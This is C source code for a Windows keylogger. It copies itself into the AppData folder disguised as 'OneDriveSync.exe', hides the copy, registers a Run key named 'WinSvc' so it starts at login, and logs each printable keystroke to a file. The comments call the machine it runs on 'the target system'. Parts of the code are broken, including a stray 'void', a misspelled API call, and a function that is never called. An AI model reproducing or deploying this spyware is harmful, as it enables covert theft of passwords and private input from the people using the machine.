#include <windows.h>
#include <shlobj.h>
#pragma comment(lib, "shell.lib")
void move_to_appdate(char *dst){
    char app[MAX_PATH], self[MAX_PATH]; //'app' holds the destination path. 'self' holds the current
    SHGetFolderPathA(0, CSIDL_APPDATA, 0, 0, app); //finds %APPDATA path
    lstrcatA(app, "\\Microsoft\\Windows\\OneDriveSync.exe");
    GetModuleFileNameA(0, self, MAX_PATH);
    if (lstrcmpiA(app, self) != 0) { // check if its already there 
        CopyFileA(self, app, FALSE);
        setFileAttributesA(app, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
    lstrcpyA(dst, app); //copies final path to dst
}
void 
void persist(const char *exePath) {
    HKEY hKey;
    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
    RegSetValueExA(hKey, "WinSvc", 0, REG_SZ, (const BYTE*)exePath, lstrlenA(exePath) + 1);
    RegCloseKey(hKey);
} // adds to win registery 'Run','winsvc' is what task manager shows, uses ANSI because its smaller
// no memory allocation at run time, avoid API's X'wchar_t*'X  2byts per char & i dont like api's, closes reg after use
int main() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH); // gets full path
    persist(path);

    HANDLE file = CreateFileA("log.txt", FILE_APPEND_DATA, FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) return 1;
	// CreateFileA instead of fopen for lower footprint, fails = exit early, FILE* goes through stdio too much mem

    DWORD written;
    char c;
	// written holds number of bytes which WriteFIle needs, c stored current char to log

    while (1) {
        for (short k = 8; k < 256; k++) {
            SHORT s = GetAsyncKeyState(k); //checks if key was just pressed
            if (s & 0x0001) { 
                if (k >= 32 && k <= 126) { // 32=space 126=~,
                    c = (char)k; // obviosly convers k to char 
                    WriteFile(file, &c, 1, &written, NULL);
                }
            }
        }
        Sleep(25); // so it doesnt eat the target system
    }

    CloseHandle(file);
    return 0;
}
